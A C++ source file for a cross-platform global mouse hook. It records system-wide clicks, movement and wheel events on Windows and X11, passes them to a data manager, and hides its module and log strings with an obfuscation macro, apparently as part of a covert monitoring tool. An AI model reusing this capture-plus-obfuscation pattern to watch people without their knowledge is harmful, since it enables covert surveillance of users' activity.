#include "hooks/MouseHook.h"
#include "data/DataManager.h"
#include "core/Logger.h"
#include "utils/TimeUtils.h"
#include "security/Obfuscation.h"
#include <string>
#include <sstream>
#include <vector>
#include <cstdint>

#if PLATFORM_WINDOWS
#include <windows.h>
#elif PLATFORM_LINUX
#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <X11/extensions/XInput2.h>
#include <pthread.h>
#include <unistd.h>
#endif

// Obfuscated strings - use char arrays instead of std::string for constexpr
const std::string OBF_MOUSEHOOK_MODULE = OBFUSCATE("MouseHook");
const std::string OBF_MOUSELOG_FORMAT = OBFUSCATE("MouseEvent: { action: %s, button: %s, pos: (%d, %d), wheel: %d }");

// Static member initialization
MouseHook* MouseHook::s_instance = nullptr;

#if PLATFORM_WINDOWS
HHOOK MouseHook::s_mouseHook = nullptr;
#endif

MouseHook::MouseHook(DataManager* dataManager)
    : m_dataManager(dataManager), m_isActive(false) 
#if PLATFORM_LINUX
    , m_mouseThread(nullptr), m_threadRunning(false)
#endif
{
    s_instance = this;
}

MouseHook::~MouseHook() {
    RemoveHook();
    s_instance = nullptr;
}

bool MouseHook::InstallHook() {
    if (m_isActive) {
        return true;
    }

#if PLATFORM_WINDOWS
    s_mouseHook = SetWindowsHookExW(
        WH_MOUSE_LL,
        MouseProc,
        GetModuleHandleW(NULL),
        0
    );

    if (!s_mouseHook) {
        DWORD error = GetLastError();
        LOG_ERROR("Failed to install mouse hook. Error: " + std::to_string(error));
        return false;
    }
#elif PLATFORM_LINUX
    // Linux implementation using XInput2
    m_threadRunning = true;
    if (pthread_create(reinterpret_cast<pthread_t*>(&m_mouseThread), 
                      nullptr, MouseThread, this) != 0) {
        LOG_ERROR("Failed to create mouse thread");
        m_threadRunning = false;
        return false;
    }
#endif

    m_isActive = true;
    LOG_INFO("Mouse hook installed successfully");
    return true;
}

bool MouseHook::RemoveHook() {
    if (!m_isActive) return true;

#if PLATFORM_WINDOWS
    if (s_mouseHook && !UnhookWindowsHookEx(s_mouseHook)) {
        DWORD error = GetLastError();
        LOG_ERROR("Failed to remove mouse hook. Error: " + std::to_string(error));
        return false;
    }

    s_mouseHook = nullptr;
#elif PLATFORM_LINUX
    m_threadRunning = false;
    if (m_mouseThread) {
        pthread_join(*reinterpret_cast<pthread_t*>(m_mouseThread), nullptr);
        m_mouseThread = nullptr;
    }
#endif

    m_isActive = false;
    LOG_INFO("Mouse hook removed successfully");
    return true;
}

#if PLATFORM_WINDOWS

LRESULT CALLBACK MouseHook::MouseProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= HC_ACTION && s_instance) {
        MSLLHOOKSTRUCT* mouseStruct = (MSLLHOOKSTRUCT*)lParam;
        s_instance->ProcessMouseEvent(wParam, mouseStruct);
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void MouseHook::ProcessMouseEvent(WPARAM eventType, MSLLHOOKSTRUCT* mouseStruct) {
    try {
        MouseHookData mouseData;
        mouseData.timestamp = utils::TimeUtils::GetCurrentTimestamp();
        mouseData.position.x = mouseStruct->pt.x;
        mouseData.position.y = mouseStruct->pt.y;
        mouseData.eventType = static_cast<unsigned int>(eventType);
        mouseData.mouseData = mouseStruct->mouseData;
        mouseData.flags = mouseStruct->flags;

        // Determine which button was pressed
        mouseData.button = GetMouseButton(eventType, mouseStruct->mouseData);

        // Add wheel delta for wheel events
        if (eventType == WM_MOUSEWHEEL) {
            mouseData.wheelDelta = static_cast<short>(HIWORD(mouseStruct->mouseData));
        } else {
            mouseData.wheelDelta = 0;
        }

        if (m_dataManager) {
            m_dataManager->AddMouseData(mouseData);
        }

        // Debug logging
        if (Logger::GetLogLevel() <= LogLevel::LEVEL_DEBUG) {
            LogMouseEvent(mouseData);
        }
    }
    catch (const std::exception& e) {
        LOG_ERROR(std::string("Error processing mouse event: ") + e.what());
    }
}

MouseButton MouseHook::GetMouseButton(WPARAM eventType, DWORD mouseData) const {
    switch (eventType) {
        case WM_LBUTTONDOWN:
        case WM_LBUTTONUP:
            return MouseButton::LEFT;
        case WM_RBUTTONDOWN:
        case WM_RBUTTONUP:
            return MouseButton::RIGHT;
        case WM_MBUTTONDOWN:
        case WM_MBUTTONUP:
            return MouseButton::MIDDLE;
        case WM_XBUTTONDOWN:
        case WM_XBUTTONUP:
            return (HIWORD(mouseData) == XBUTTON1) ? 
                MouseButton::X1 : MouseButton::X2;
        default:
            return MouseButton::NONE;
    }
}

#elif PLATFORM_LINUX

void* MouseHook::MouseThread(void* param) {
    MouseHook* instance = static_cast<MouseHook*>(param);
    Display* display = XOpenDisplay(NULL);
    
    if (!display) {
        LOG_ERROR("Cannot open X display");
        return nullptr;
    }

    Window root = DefaultRootWindow(display);
    
    // Select events
    XSelectInput(display, root, ButtonPressMask | ButtonReleaseMask | PointerMotionMask);

    XEvent event;
    while (instance->m_threadRunning) {
        if (XPending(display) > 0) {
            XNextEvent(display, &event);
            
            MouseHookData mouseData;
            mouseData.timestamp = utils::TimeUtils::GetCurrentTimestamp();
            mouseData.position.x = event.xbutton.x;
            mouseData.position.y = event.xbutton.y;
            mouseData.wheelDelta = 0;
            mouseData.mouseData = 0;
            mouseData.flags = 0;

            switch (event.type) {
                case ButtonPress:
                    mouseData.eventType = ButtonPress;
                    switch (event.xbutton.button) {
                        case 1: mouseData.button = MouseButton::LEFT; break;
                        case 2: mouseData.button = MouseButton::MIDDLE; break;
                        case 3: mouseData.button = MouseButton::RIGHT; break;
                        case 8: mouseData.button = MouseButton::X1; break;
                        case 9: mouseData.button = MouseButton::X2; break;
                        default: mouseData.button = MouseButton::NONE; break;
                    }
                    break;
                
                case ButtonRelease:
                    mouseData.eventType = ButtonRelease;
                    switch (event.xbutton.button) {
                        case 1: mouseData.button = MouseButton::LEFT; break;
                        case 2: mouseData.button = MouseButton::MIDDLE; break;
                        case 3: mouseData.button = MouseButton::RIGHT; break;
                        case 8: mouseData.button = MouseButton::X1; break;
                        case 9: mouseData.button = MouseButton::X2; break;
                        default: mouseData.button = MouseButton::NONE; break;
                    }
                    break;
                
                case MotionNotify:
                    mouseData.eventType = MotionNotify;
                    mouseData.button = MouseButton::NONE;
                    break;
                
                default:
                    continue;
            }

            if (instance->m_dataManager) {
                instance->m_dataManager->AddMouseData(mouseData);
            }

            if (Logger::GetLogLevel() <= LogLevel::LEVEL_DEBUG) {
                instance->LogMouseEvent(mouseData);
            }
        } else {
            usleep(10000); // 10ms sleep to prevent CPU overuse
        }
    }

    XCloseDisplay(display);
    return nullptr;
}

#endif

void MouseHook::LogMouseEvent(const MouseHookData& mouseData) const {
    std::string action;
    switch (mouseData.eventType) {
#if PLATFORM_WINDOWS
        case WM_LBUTTONDOWN: case WM_RBUTTONDOWN: case WM_MBUTTONDOWN:
        case WM_XBUTTONDOWN: action = "DOWN"; break;
        case WM_LBUTTONUP: case WM_RBUTTONUP: case WM_MBUTTONUP:
        case WM_XBUTTONUP: action = "UP"; break;
        case WM_MOUSEMOVE: action = "MOVE"; break;
        case WM_MOUSEWHEEL: action = "WHEEL"; break;
#elif PLATFORM_LINUX
        case ButtonPress: action = "DOWN"; break;
        case ButtonRelease: action = "UP"; break;
        case MotionNotify: action = "MOVE"; break;
#endif
        default: action = "UNKNOWN"; break;
    }

    std::string button;
    switch (mouseData.button) {
        case MouseButton::LEFT: button = "LEFT"; break;
        case MouseButton::RIGHT: button = "RIGHT"; break;
        case MouseButton::MIDDLE: button = "MIDDLE"; break;
        case MouseButton::X1: button = "X1"; break;
        case MouseButton::X2: button = "X2"; break;
        default: button = "NONE"; break;
    }

    char logMessage[512];
    snprintf(logMessage, sizeof(logMessage), OBF_MOUSELOG_FORMAT.c_str(),
             action.c_str(), button.c_str(),
             mouseData.position.x, mouseData.position.y,
             mouseData.wheelDelta);

    LOG_DEBUG(logMessage);
}